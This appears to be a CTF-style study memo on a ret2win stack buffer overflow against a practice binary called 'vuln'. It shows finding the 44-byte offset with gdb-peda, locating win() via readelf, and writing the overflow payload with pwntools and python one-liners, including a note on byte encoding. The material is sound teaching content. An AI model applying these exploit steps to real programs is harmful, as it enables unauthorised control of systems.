# Lesson
- BOF  
    - input with `python`  
    - `pattern_create` of `gbd-peda`  
    - find an address of a specific function with `pwntools`  

# Memo
1. get a byte size for BOF  
    - ghidra, gdb  
        ```console
        gdb-peda$ break *0x080492c3 # ret on vuln
        gdb-peda$ start
        gdb-peda$ pattern_create 50
        AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA
        gdb-peda$ continue
        AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA
        ...
        [------------------------------------stack-------------------------------------]
        0000| 0xffffcedc ("AFAAbA")
        0004| 0xffffcee0 --> 0xff004162
        0008| 0xffffcee4 --> 0xf7fbe66c --> 0xf7ffdba0 --> 0xf7fbe780 --> 0xf7ffda40 --> 0x0
        0012| 0xffffcee8 --> 0xf7fbeb10 --> 0xf7d92cc6 ("GLIBC_PRIVATE")
        ...
        gdb-peda$ pattern_offset AFAA
        AFAA found at offset: 44
        gdb-peda$ 
        ```
    or  
    - manual trial-and-error  
2. get a target address  
    - ghidra  
    - readelf  
        ```console
        $ readelf -s ./vuln | grep FUNC
        1: 00000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.0 (2)
        2: 00000000     0 FUNC    GLOBAL DEFAULT  UND gets@GLIBC_2.0 (2)
        3: 00000000     0 FUNC    GLOBAL DEFAULT  UND fgets@GLIBC_2.0 (2)
        ...
        49: 08049281    67 FUNC    GLOBAL DEFAULT   13 vuln
        ...
        63: 080491f6   139 FUNC    GLOBAL DEFAULT   13 win
        ...
        72: 080492c4   122 FUNC    GLOBAL DEFAULT   13 main
        ...
        ```
        get "0x080491f6" of win()  

3. exploit on local machine  
    - pwntools  
        - ghidra  
            ```python
            payload += p32(0x80491f6)
            ```
         or  
        - library of pwntools  
            ```
            elf = ELF('./vuln')
            win_addr = elf.symbols['win']
            payload += p32(win_addr)
            ```
    - manual  
        - good case  
            ```console
            $ python3 -c "import sys; sys.stdout.buffer.write(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08')" | ./vuln
            ```
            test  
            ```console
            $ python3 -c "import sys; sys.stdout.buffer.write(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08')" | xxd
            00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
            00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
            00000020: 4141 4141 4141 4141 4141 4141 f691 0408  AAAAAAAAAAAA....
            ```
        - bad case  
            ```console
            $ python3 -c "print('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08')" | ./vuln
            ```
            test  
            ```console
            $ python3 -c "print('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08')" | xxd
            00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
            00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
            00000020: 4141 4141 4141 4141 4141 4141 c3b6 c291  AAAAAAAAAAAA....
            00000030: 0408 0a
            ```
            Byte stream is bad.

4. exploit on remote machine
    - pwntools  
        solver.py
    - socket  
